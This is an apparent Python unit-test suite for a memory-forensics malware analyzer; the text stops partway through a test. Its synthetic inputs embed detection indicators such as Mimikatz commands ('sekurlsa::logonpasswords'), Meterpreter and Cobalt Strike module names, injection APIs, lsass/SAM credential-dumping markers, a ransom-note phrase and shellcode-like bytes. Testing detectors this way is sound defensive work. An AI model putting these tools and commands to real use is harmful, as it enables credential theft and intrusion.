#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║    ULTRA-DEEP TEST SUITE v3.0 — Memory Forensics Analyzer       ║
║    Comprehensive tests for all classes, engine, and GUI          ║
╚══════════════════════════════════════════════════════════════════╝

Tests every public method, edge case, and integration path.
Run:  python ultra_deep_test.py
"""

import unittest
import os
import sys
import struct
import json
import csv
import tempfile
import hashlib
import math
import io
from collections import Counter
from unittest.mock import patch, MagicMock

# Ensure project directory is on path
_script_dir = os.path.dirname(os.path.abspath(__file__))
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

from memory_forensics_tool import (
    AdvancedPEAnalyzer,
    YARALikeEngine,
    ExternalYARALoader,
    NGramAnalyzer,
    ObfuscationDetector,
    AdvancedMLDetector,
    MLMalwareDetector,
    MemoryForensicsEngine,
)

# Path to the synthetic test dump
TEST_DUMP = os.path.join(_script_dir, 'test_forensic_dump.raw')


# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════

def _build_pe(sections=None, timestamp=0x12345678, num_sections=1, imports=None):
    """Build a minimal valid PE for testing."""
    pe = bytearray(4096)
    pe[0:2] = b'MZ'
    struct.pack_into('<I', pe, 60, 128)       # e_lfanew
    pe[128:132] = b'PE\x00\x00'
    # COFF
    struct.pack_into('<H', pe, 132, 0x14C)    # Machine: i386
    struct.pack_into('<H', pe, 134, num_sections)
    struct.pack_into('<I', pe, 136, timestamp)
    struct.pack_into('<H', pe, 150, 0x0102)
    # Optional header
    struct.pack_into('<H', pe, 152, 0x10b)    # PE32
    struct.pack_into('<I', pe, 168, 0x1000)   # EntryPoint
    # Section at offset 152 + 96 = 248
    sec_off = 248
    if sections:
        for i, (name, vsize, rsize, chars) in enumerate(sections):
            off = sec_off + i * 40
            pe[off:off+8] = name.ljust(8, b'\x00')[:8]
            struct.pack_into('<I', pe, off+8, vsize)
            struct.pack_into('<I', pe, off+12, 0x1000 * (i+1))
            struct.pack_into('<I', pe, off+16, rsize)
            struct.pack_into('<I', pe, off+36, chars)
    else:
        pe[sec_off:sec_off+8] = b'.text\x00\x00\x00'
        struct.pack_into('<I', pe, sec_off+8, 0x1000)
        struct.pack_into('<I', pe, sec_off+16, 0x200)
        struct.pack_into('<I', pe, sec_off+36, 0x60000020)
    # Embed imports if requested
    if imports:
        offset = 600
        for imp in imports:
            pe[offset:offset+len(imp)] = imp
            offset += len(imp) + 1
    return bytes(pe)


def _loaded_engine():
    """Return an engine loaded with the test dump."""
    engine = MemoryForensicsEngine()
    engine.load_dump(TEST_DUMP)
    return engine


# ═══════════════════════════════════════════════════════════════
#  TEST: AdvancedPEAnalyzer
# ═══════════════════════════════════════════════════════════════

class TestAdvancedPEAnalyzer(unittest.TestCase):
    """Tests for PE header analysis."""

    def setUp(self):
        self.analyzer = AdvancedPEAnalyzer()

    # -- Basic --
    def test_empty_data(self):
        r = self.analyzer.analyze(b'')
        self.assertFalse(r['is_pe'])

    def test_short_data(self):
        r = self.analyzer.analyze(b'MZ' + b'\x00' * 30)
        self.assertFalse(r['is_pe'])

    def test_non_pe_data(self):
        r = self.analyzer.analyze(b'NOT_A_PE_FILE' * 100)
        self.assertFalse(r['is_pe'])

    def test_none_data(self):
        r = self.analyzer.analyze(None)
        self.assertFalse(r['is_pe'])

    # -- Valid PE --
    def test_valid_pe(self):
        pe = _build_pe()
        r = self.analyzer.analyze(pe)
        self.assertTrue(r['is_pe'])
        self.assertIsInstance(r['sections'], list)
        self.assertIsInstance(r['anomalies'], list)

    def test_pe_zero_timestamp_anomaly(self):
        pe = _build_pe(timestamp=0)
        r = self.analyzer.analyze(pe)
        self.assertTrue(r['is_pe'])
        self.assertTrue(any('Zero timestamp' in a for a in r['anomalies']))
        self.assertGreater(r['risk_score'], 0)

    def test_pe_too_many_sections(self):
        pe = _build_pe(num_sections=25)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('section count' in a for a in r['anomalies']))

    def test_pe_packer_section(self):
        sections = [(b'.UPX0', 0x1000, 0x200, 0x60000020)]
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertIsNotNone(r['packer_detected'])
        self.assertTrue(any('Packer' in a for a in r['anomalies']))

    def test_pe_writable_executable_section(self):
        # writable (0x80000000) + executable (0x20000000)
        sections = [(b'.text', 0x1000, 0x200, 0xA0000020)]
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('writable+executable' in a for a in r['anomalies']))

    def test_pe_suspicious_size_ratio(self):
        sections = [(b'.data', 0x100000, 0x100, 0x60000020)]  # vsize >> rsize
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('size ratio' in a for a in r['anomalies']))

    # -- Import analysis --
    def test_import_analysis_injection(self):
        imports = [b'VirtualAllocEx', b'WriteProcessMemory', b'CreateRemoteThread']
        pe = _build_pe(imports=imports)
        r = self.analyzer.analyze(pe)
        imp = r['imports']
        self.assertIn('injection', imp['categories'])
        self.assertGreater(imp['total'], 0)

    def test_import_analysis_no_suspicious(self):
        pe = _build_pe()
        r = self.analyzer.analyze(pe)
        self.assertEqual(r['imports']['total'], 0)

    # -- Invalid PE offset --
    def test_invalid_pe_offset(self):
        pe = bytearray(128)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 9999)  # offset past end
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(r['is_pe'])
        self.assertTrue(any('Invalid PE offset' in a for a in r['anomalies']))

    def test_invalid_pe_signature(self):
        pe = bytearray(256)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 128)
        pe[128:132] = b'XX\x00\x00'  # bad signature
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(any('Invalid PE signature' in a for a in r['anomalies']))

    def test_pe64_parsing(self):
        pe = bytearray(4096)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 128)
        pe[128:132] = b'PE\x00\x00'
        struct.pack_into('<H', pe, 134, 1)     # 1 section
        struct.pack_into('<I', pe, 136, 100)
        struct.pack_into('<H', pe, 152, 0x20b)  # PE32+
        # section at 152 + 112 = 264
        pe[264:272] = b'.text\x00\x00\x00'
        struct.pack_into('<I', pe, 272, 0x1000)
        struct.pack_into('<I', pe, 280, 0x200)
        struct.pack_into('<I', pe, 300, 0x60000020)
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(r['is_pe'])
        self.assertEqual(len(r['sections']), 1)


# ═══════════════════════════════════════════════════════════════
#  TEST: YARALikeEngine
# ═══════════════════════════════════════════════════════════════

class TestYARALikeEngine(unittest.TestCase):
    """Tests for YARA-like pattern matching."""

    def setUp(self):
        self.engine = YARALikeEngine()

    def test_no_matches_clean_data(self):
        r = self.engine.scan(b'This is perfectly clean data with nothing suspicious at all.')
        self.assertEqual(len(r), 0)

    def test_mimikatz_detection(self):
        data = b'\x00' * 100 + b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa' + b'\x00' * 100
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Mimikatz', names)

    def test_meterpreter_detection(self):
        data = b'\x00' * 50 + b'metsrv' + b'\x00' * 50 + b'ext_server_stdapi' + b'\x00' * 50 + b'ReflectiveLoader' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Metasploit_Meterpreter', names)

    def test_cobalt_strike_detection(self):
        data = b'\x00' * 50 + b'beacon.dll' + b'\x00' * 50 + b'beacon.x64.dll' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('CobaltStrike_Beacon', names)

    def test_empire_detection(self):
        data = b'\x00' * 50 + b'Invoke-Empire' + b'\x00' * 50 + b'empire_staging' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('PowerShell_Empire', names)

    def test_process_injection_detection(self):
        data = (b'\x00' * 50 + b'VirtualAllocEx' + b'\x00' * 50 +
                b'WriteProcessMemory' + b'\x00' * 50 + b'CreateRemoteThread' + b'\x00' * 50)
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Process_Injection', names)

    def test_credential_dumper_detection(self):
        data = (b'\x00' * 50 + b'lsass' + b'\x00' * 50 +
                b'SECURITY' + b'\x00' * 50 + b'SAM' + b'\x00' * 50)
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Credential_Dumper', names)

    def test_ransomware_detection(self):
        data = b'\x00' * 50 + b'YOUR FILES HAVE BEEN ENCRYPTED' + b'\x00' * 50 + b'Bitcoin' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Ransomware_Indicators', names)

    def test_shellcode_nop_sled(self):
        data = b'\x00' * 50 + b'\x90' * 16 + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Shellcode_Generic', names)

    def test_shellcode_xor_instructions(self):
        data = b'\x00' * 50 + b'\x31\xc0' + b'\x31\xdb' + b'\x31\xc9' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Shellcode_Generic', names)

    def test_result_structure(self):
        data = b'\x00' * 50 + b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa' + b'\x00' * 50
        r = self.engine.scan(data)
        for match in r:
            self.assertIn('rule', match)
            self.assertIn('severity', match)
            self.assertIn('confidence', match)
            self.assertIn('offset', match)
            self.assertIn('total_matches', match)
            self.assertLessEqual(match['confidence'], 99.5)

    def test_confidence_cap(self):
        """Confidence should never exceed 99.5"""
        data = b'\x00'.join([b'mimikatz', b'gentilkiwi', b'sekurlsa', b'kerberos::',
                             b'lsadump::', b'privilege::debug', b'token::elevate'])
        r = self.engine.scan(data)
        for match in r:
            self.assertLessEqual(match['confidence'], 99.5)

    def test_empty_data(self):
        r = self.engine.scan(b'')
        self.assertEqual(len(r), 0)

    def test_scan_full_dump(self):
        with open(TEST_DUMP, 'rb') as f:
            data = f.read()
        r = self.engine.scan(data)
        self.assertIsInstance(r, list)
        self.assertGreater(len(r), 0)  # Our test dump has embedded patterns


# ═══════════════════════════════════════════════════════════════
#  TEST: NGramAnalyzer
# ═══════════════════════════════════════════════════════════════

class TestNGramAnalyzer(unittest.TestCase):
    """Tests for N-gram byte analysis."""

    def setUp(self):
        self.analyzer = NGramAnalyzer()

    def test_empty_data(self):
        r = self.analyzer.analyze(b'')
        self.assertEqual(r['risk_score'], 0)

    def test_short_data(self):
        r = self.analyzer.analyze(b'\x00', ngram_size=3)
        self.assertEqual(r['risk_score'], 0)

    def test_clean_text(self):
        r = self.analyzer.analyze(b'Hello this is perfectly normal text data' * 10)
        self.assertEqual(r['risk_score'], 0)

    def test_shellcode_patterns(self):
        data = b'\xff\xd0' * 5 + b'\xff\xe0' * 5 + b'\xff\xe4' * 5 + b'\x00' * 100
        r = self.analyzer.analyze(data)
        self.assertGreater(r['risk_score'], 0)

    def test_result_structure(self):
        r = self.analyzer.analyze(b'\x00' * 1000)
        self.assertIn('risk_score', r)
        self.assertIn('suspicious_patterns', r)
        self.assertIn('unique_ngrams', r)
        self.assertIn('total_ngrams', r)

    def test_risk_score_capped_at_100(self):
        # Generate lots of suspicious patterns
        data = b'\xff\xd0\xff\xe0\xff\xe4\x31\xc0\x50\x31\xdb\x53' * 200
        r = self.analyzer.analyze(data)
        self.assertLessEqual(r['risk_score'], 100)

    def test_custom_ngram_size(self):
        r = self.analyzer.analyze(b'\x00' * 100, ngram_size=5)
        self.assertIn('unique_ngrams', r)


# ═══════════════════════════════════════════════════════════════
#  TEST: ObfuscationDetector
# ═══════════════════════════════════════════════════════════════

class TestObfuscationDetector(unittest.TestCase):
    """Tests for obfuscation/packing detection."""

    def setUp(self):
        self.detector = ObfuscationDetector()

    def test_empty_data(self):
        r = self.detector.analyze(b'')
        self.assertFalse(r['is_obfuscated'])
        self.assertEqual(r['confidence'], 0)

    def test_short_data(self):
        r = self.detector.analyze(b'short')
        self.assertFalse(r['is_obfuscated'])

    def test_normal_text(self):
        r = self.detector.analyze(b'This is normal text data. ' * 100)
        self.assertFalse(r['is_obfuscated'])

    def test_high_entropy_data(self):
        """Random bytes should have high entropy."""
        import random
        random.seed(99)
        data = bytes(random.randint(0, 255) for _ in range(10000))
        r = self.detector.analyze(data)
        self.assertGreater(r['entropy_score'], 7.0)

    def test_upx_packer_detection(self):
        data = b'\x00' * 500 + b'UPX!' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('UPX' in t for t in r['techniques']))

    def test_aspack_packer_detection(self):
        data = b'\x00' * 500 + b'ASPack' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('ASPack' in t for t in r['techniques']))

    def test_themida_detection(self):
        data = b'\x00' * 500 + b'Themida' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('Themida' in t for t in r['techniques']))

    def test_vmprotect_detection(self):
        data = b'\x00' * 500 + b'.vmp0' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('VMProtect' in t for t in r['techniques']))

    def test_base64_detection(self):
        data = b'Normal preamble ' * 50
        data += b'SSBhbSBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk'
        data += b' more data ' * 50
        r = self.detector.analyze(data)
        self.assertTrue(any('Base64' in t for t in r['techniques']))

    def test_confidence_capped_at_99(self):
        data = b'\x00' * 500 + b'UPX!' + b'Themida' + b'ASPack'
        import random
        random.seed(42)
        data += bytes(random.randint(0, 255) for _ in range(5000))
        r = self.detector.analyze(data)
        self.assertLessEqual(r['confidence'], 99)

    def test_entropy_calculation(self):
        # All same byte → entropy = 0
        e = self.detector._calculate_entropy(b'\x00' * 1000)
        self.assertAlmostEqual(e, 0.0)
        # Perfectly uniform → entropy ≈ 8
        data = bytes(range(256)) * 100
        e = self.detector._calculate_entropy(data)
        self.assertGreater(e, 7.9)

    def test_xor_detection(self):
        # One byte dominates → high XOR score
        data = b'\x41' * 200 + b'\x00' * 10
        score = self.detector._detect_xor_encoding(data)
        self.assertGreater(score, 0.5)

    def test_xor_no_detection(self):
        score = self.detector._detect_xor_encoding(b'')
        self.assertEqual(score, 0.0)


# ═══════════════════════════════════════════════════════════════
#  TEST: AdvancedMLDetector (ensemble of PE+YARA+NGram+Obfuscation)
# ═══════════════════════════════════════════════════════════════

class TestAdvancedMLDetector(unittest.TestCase):
    """Tests for the multi-layer ensemble detector."""

    def setUp(self):
        self.detector = AdvancedMLDetector()

    def test_clean_data(self):
        r = self.detector.detect(b'Clean legitimate data. ' * 100)
        self.assertFalse(r['is_malicious'])
        self.assertEqual(r['risk_level'], 'LOW')

    def test_empty_data(self):
        r = self.detector.detect(b'')
        self.assertFalse(r['is_malicious'])

    def test_short_data(self):
        r = self.detector.detect(b'short')
        self.assertFalse(r['is_malicious'])

    def test_malicious_data(self):
        """Data with multiple strong indicators should be flagged."""
        data = _build_pe(imports=[b'VirtualAllocEx', b'WriteProcessMemory', b'CreateRemoteThread'])
        data += b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa'
        r = self.detector.detect(data)
        self.assertGreater(r['ensemble_score'], 0)
        self.assertIn('analysis', r)
        self.assertIn('pe', r['analysis'])
        self.assertIn('yara', r['analysis'])
        self.assertIn('ngram', r['analysis'])
        self.assertIn('obfuscation', r['analysis'])

    def test_result_structure(self):
        r = self.detector.detect(b'\x00' * 200)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('risk_level', r)
        self.assertIn('detections', r)

    def test_risk_levels(self):
        # Check that risk_level is a valid value
        r = self.detector.detect(b'\x00' * 200)
        self.assertIn(r['risk_level'], ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'])

    def test_detailed_report(self):
        data = b'\x00' * 200
        report = self.detector.get_detailed_report(data)
        self.assertIsInstance(report, str)
        self.assertIn('ADVANCED ENTERPRISE MALWARE DETECTION REPORT', report)

    def test_weights_sum_to_one(self):
        total = sum(self.detector.weights.values())
        self.assertAlmostEqual(total, 1.0, places=2)


# ═══════════════════════════════════════════════════════════════
#  TEST: MLMalwareDetector
# ═══════════════════════════════════════════════════════════════

class TestMLMalwareDetector(unittest.TestCase):
    """Tests for ML-based malware detection."""

    def setUp(self):
        self.detector = MLMalwareDetector()

    def test_clean_data(self):
        data = b'Normal safe text data content. ' * 100
        r = self.detector.detect(data)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('features', r)

    def test_insufficient_data(self):
        r = self.detector.detect(b'tiny')
        self.assertFalse(r['is_malicious'])
        self.assertIn('Insufficient data', r.get('precision_note', ''))

    def test_empty_data(self):
        r = self.detector.detect(b'')
        self.assertFalse(r['is_malicious'])

    def test_mimikatz_fingerprint(self):
        data = b'\x00' * 500 + b'gentilkiwi' + b'\x00' * 100 + b'mimikatz' + b'\x00' * 100 + b'sekurlsa::logonpasswords'
        data += b'\x00' * 500
        r = self.detector.detect(data)
        # Should find mimikatz family
        families = [d['family'] for d in r.get('detections', [])]
        self.assertTrue(any('Mimikatz' in f for f in families))

    def test_metasploit_fingerprint(self):
        data = b'\x00' * 500 + b'metsrv.dll' + b'\x00' * 100 + b'ext_server_stdapi' + b'\x00' * 100 + b'ReflectiveLoader'
        data += b'\x00' * 500
        r = self.detector.detect(data)
        families = [d['family'] for d in r.get('detections', [])]
        self.assertTrue(any('Metasploit' in f for f in families))

    def test_feature_extraction(self):
        data = b'\x00' * 2000
        features = self.detector.extract_features(data)
        self.assertIn('entropy', features)
        self.assertIn('api_pattern_score', features)
        self.assertIn('string_ioc_score', features)
        self.assertIn('byte_distribution_anomaly', features)
        self.assertIn('structural_anomaly', features)
        self.assertIn('legitimate_score', features)

    def test_entropy_calculation(self):
        e = self.detector._calculate_entropy(b'\x00' * 1000)
        self.assertAlmostEqual(e, 0.0)
        data = bytes(range(256)) * 10
        e = self.detector._calculate_entropy(data)
        self.assertGreater(e, 7.9)

    def test_entropy_variance(self):
        data = b'\x00' * 8192
        v = self.detector._calculate_entropy_variance(data)
        self.assertAlmostEqual(v, 0.0)

    def test_entropy_variance_short_data(self):
        v = self.detector._calculate_entropy_variance(b'abc')
        self.assertEqual(v, 0.0)

    def test_byte_distribution(self):
        r = self.detector._analyze_byte_distribution(b'\x00' * 100)
        self.assertEqual(r['null_ratio'], 1.0)
        self.assertEqual(r['printable_ratio'], 0.0)

    def test_byte_distribution_empty(self):
        r = self.detector._analyze_byte_distribution(b'')
        self.assertEqual(r['anomaly_score'], 0.0)

    def test_api_pattern_scoring(self):
        data = (b'\x00' * 50 + b'VirtualAllocEx' + b'\x00' * 50 +
                b'WriteProcessMemory' + b'\x00' * 50 + b'CreateRemoteThread' + b'\x00' * 200)
        score = self.detector._score_api_patterns(data)
        self.assertGreater(score, 0)

    def test_legitimate_indicators(self):
        data = b'\x00' * 500 + b'Microsoft Corporation' + b'\x00' * 100 + b'Copyright (c)' + b'\x00' * 500
        score = self.detector._score_legitimate_indicators(data)
        self.assertGreater(score, 0)

    def test_structural_analysis(self):
        data = b'\x90' * 8 + b'\x31\xc0' + b'\x31\xdb' + b'\x31\xc9' + b'\x00' * 100
        score = self.detector._analyze_structure(data)
        self.assertGreater(score, 0)

    def test_validation(self):
        data = b'\x00' * 2000
        r = self.detector.detect(data)
        validation = self.detector.validate_detection(data, r.get('detections', []))
        self.assertIn('validated', validation)
        self.assertIn('validation_score', validation)
        self.assertIn('checks_passed', validation)

    def test_precision_mode(self):
        self.detector.precision_mode = True
        data = b'\x00' * 2000
        r = self.detector.detect(data)
        self.assertIn('precision_note', r)

    def test_confidence_capped(self):
        """Confidence should never exceed 0.995"""
        data = (b'\x00' * 500 + b'gentilkiwi' + b'mimikatz' + b'sekurlsa::logonpasswords'
                + b'VirtualAllocEx' + b'WriteProcessMemory' + b'CreateRemoteThread'
                + b'NtCreateThreadEx' + b'RtlCreateUserThread' + b'QueueUserAPC'
                + b'\x00' * 500)
        r = self.detector.detect(data)
        self.assertLessEqual(r['confidence'], 0.995)


# ═══════════════════════════════════════════════════════════════
#  TEST: MemoryForensicsEngine
# ═══════════════════════════════════════════════════════════════

class TestEngineInit(unittest.TestCase):
    """Engine initialization tests."""

    def test_default_state(self):
        e = MemoryForensicsEngine()
        self.assertIsNone(e.dump_data)
        self.assertIsNone(e.dump_path)
        self.assertEqual(e.dump_size, 0)
        self.assertEqual(e.risk_score, 0)
        self.assertEqual(e.findings, [])
        self.assertIsNotNone(e.ml_detector)
        self.assertIsNotNone(e.advanced_detector)


class TestEngineLoad(unittest.TestCase):
    """Tests for loading dumps."""

    def test_load_test_dump(self):
        e = MemoryForensicsEngine()
        size = e.load_dump(TEST_DUMP)
        self.assertGreater(size, 0)
        self.assertIsNotNone(e.dump_data)
        self.assertEqual(e.dump_path, TEST_DUMP)
        self.assertEqual(e.dump_size, size)

    def test_load_nonexistent_file(self):
        e = MemoryForensicsEngine()
        with self.assertRaises((FileNotFoundError, OSError)):
            e.load_dump('nonexistent_file.raw')


class TestEngineHashes(unittest.TestCase):
    """Tests for file hash computation."""

    def test_hashes_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.get_file_hashes(), {})

    def test_hashes_with_data(self):
        e = _loaded_engine()
        h = e.get_file_hashes()
        self.assertIn('MD5', h)
        self.assertIn('SHA1', h)
        self.assertIn('SHA256', h)
        self.assertEqual(len(h['MD5']), 32)
        self.assertEqual(len(h['SHA1']), 40)
        self.assertEqual(len(h['SHA256']), 64)

    def test_hashes_consistency(self):
        e = _loaded_engine()
        h1 = e.get_file_hashes()
        h2 = e.get_file_hashes()
        self.assertEqual(h1, h2)

    def test_get_hashes_alias(self):
        e = _loaded_engine()
        h = e.get_hashes()
        self.assertIn('md5', h)
        self.assertIn('sha1', h)
        self.assertIn('sha256', h)

    def test_get_hashes_no_data(self):
        e = MemoryForensicsEngine()
        h = e.get_hashes()
        self.assertEqual(h['md5'], '')
        self.assertEqual(h['sha1'], '')
        self.assertEqual(h['sha256'], '')


class TestEngineDumpType(unittest.TestCase):
    """Tests for dump type detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.detect_dump_type(), "Unknown")

    def test_minidump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'MDMP' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "Windows Minidump (.dmp)")

    def test_full_dump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'PAGE' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "Windows Full Memory Dump")

    def test_pmem(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'PMEM' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "PMem Format")

    def test_kernel_dump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'KDMP\x00\x00\x00\x00' + b'\x00' * 100
        e.dump_size = 108
        self.assertEqual(e.detect_dump_type(), "Windows Kernel Dump")

    def test_elf_core(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'\x7fELF' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "ELF Core Dump (Linux)")

    def test_pe_executable(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'MZ' + b'\x00' * 100
        e.dump_size = 102
        self.assertEqual(e.detect_dump_type(), "PE Executable (Possible Process Dump)")

    def test_vmem(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'\x00' * 200
        e.dump_size = 200
        e.dump_path = 'test.vmem'
        self.assertEqual(e.detect_dump_type(), "VMware Snapshot (.vmem)")

    def test_raw_dump(self):
        e = _loaded_engine()
        dt = e.detect_dump_type()
        self.assertIn('Raw Memory Dump', dt)


class TestEngineStrings(unittest.TestCase):
    """Tests for string extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_strings(), [])

    def test_ascii_strings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='ascii')
        self.assertIsInstance(strings, list)
        self.assertGreater(len(strings), 0)
        for s in strings:
            self.assertIn('offset', s)
            self.assertIn('type', s)
            self.assertIn('value', s)
            self.assertEqual(s['type'], 'ASCII')

    def test_unicode_strings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='unicode')
        self.assertIsInstance(strings, list)
        # Our dump has UTF-16-LE strings
        for s in strings:
            self.assertEqual(s['type'], 'Unicode')

    def test_both_encodings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='both')
        types = set(s['type'] for s in strings)
        self.assertIn('ASCII', types)

    def test_min_length_filter(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=20)
        for s in strings:
            self.assertGreaterEqual(len(s['value']), 20)


class TestEngineProcesses(unittest.TestCase):
    """Tests for process discovery."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.find_processes(), [])

    def test_finds_processes(self):
        e = _loaded_engine()
        procs = e.find_processes()
        self.assertIsInstance(procs, list)
        self.assertGreater(len(procs), 0)

    def test_process_structure(self):
        e = _loaded_engine()
        procs = e.find_processes()
        for p in procs:
            self.assertIn('offset', p)
            self.assertIn('name', p)
            self.assertIn('type', p)
            self.assertIn('suspicious', p)

    def test_finds_suspicious_processes(self):
        e = _loaded_engine()
        procs = e.find_processes()
        suspicious = [p for p in procs if p['suspicious']]
        self.assertGreater(len(suspicious), 0)

    def test_scan_processes_alias(self):
        e = _loaded_engine()
        procs = e.scan_processes()
        self.assertIsInstance(procs, list)
        self.assertGreater(len(procs), 0)

    def test_is_suspicious_process(self):
        e = MemoryForensicsEngine()
        self.assertTrue(e._is_suspicious_process('mimikatz.exe'))
        self.assertTrue(e._is_suspicious_process('mimikatz'))
        self.assertTrue(e._is_suspicious_process('beacon.exe'))
        self.assertFalse(e._is_suspicious_process('notepad.exe'))
        self.assertFalse(e._is_suspicious_process(''))
        self.assertFalse(e._is_suspicious_process('abc'))
        self.assertFalse(e._is_suspicious_process(None))

    def test_is_suspicious_with_path(self):
        e = MemoryForensicsEngine()
        self.assertTrue(e._is_suspicious_process('C:\\Temp\\mimikatz.exe'))
        self.assertFalse(e._is_suspicious_process('C:\\Windows\\notepad.exe'))


class TestEngineNetwork(unittest.TestCase):
    """Tests for network artifact extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_network_artifacts(), {})

    def test_finds_artifacts(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertIn('ipv4', net)
        self.assertIn('url', net)
        self.assertIn('domain', net)
        self.assertIn('email', net)

    def test_finds_ips(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['ipv4']), 0)

    def test_finds_urls(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['url']), 0)

    def test_finds_domains(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['domain']), 0)

    def test_finds_emails(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['email']), 0)


class TestEngineMalwareSignatures(unittest.TestCase):
    """Tests for malware signature detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.detect_malware_signatures(), [])

    def test_finds_signatures(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        self.assertIsInstance(sigs, list)
        self.assertGreater(len(sigs), 0)

    def test_signature_structure(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        for sig in sigs:
            self.assertIn('name', sig)
            self.assertIn('matched_signatures', sig)
            self.assertIn('total_signatures', sig)
            self.assertIn('confidence', sig)
            self.assertIn('severity', sig)
            self.assertIn(sig['severity'], ['CRITICAL', 'HIGH', 'MEDIUM'])

    def test_scan_malware_alias(self):
        e = _loaded_engine()
        sigs = e.scan_malware_signatures()
        self.assertIsInstance(sigs, list)

    def test_finds_mimikatz(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        names = [s['name'] for s in sigs]
        self.assertIn('Mimikatz', names)


class TestEngineMLDetection(unittest.TestCase):
    """Tests for ML-based malware detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.ml_detect_malware()
        self.assertFalse(r['is_malicious'])

    def test_with_test_dump(self):
        e = _loaded_engine()
        r = e.ml_detect_malware(precision_mode=True)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('validation', r)
        self.assertIn('estimated_precision', r)

    def test_precision_mode_flag(self):
        e = _loaded_engine()
        r = e.ml_detect_malware(precision_mode=False)
        self.assertIn('is_malicious', r)

    def test_ml_report(self):
        e = _loaded_engine()
        report = e.get_ml_analysis_report()
        self.assertIsInstance(report, str)
        self.assertIn('ML-BASED MALWARE DETECTION REPORT', report)

    def test_ml_report_no_data(self):
        e = MemoryForensicsEngine()
        report = e.get_ml_analysis_report()
        self.assertIn('No data loaded', report)


class TestEngineAdvancedML(unittest.TestCase):
    """Tests for advanced ML detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.advanced_ml_detect()
        self.assertFalse(r['is_malicious'])
        self.assertEqual(r['risk_level'], 'LOW')

    def test_with_test_dump(self):
        e = _loaded_engine()
        r = e.advanced_ml_detect()
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('risk_level', r)

    def test_advanced_report(self):
        e = _loaded_engine()
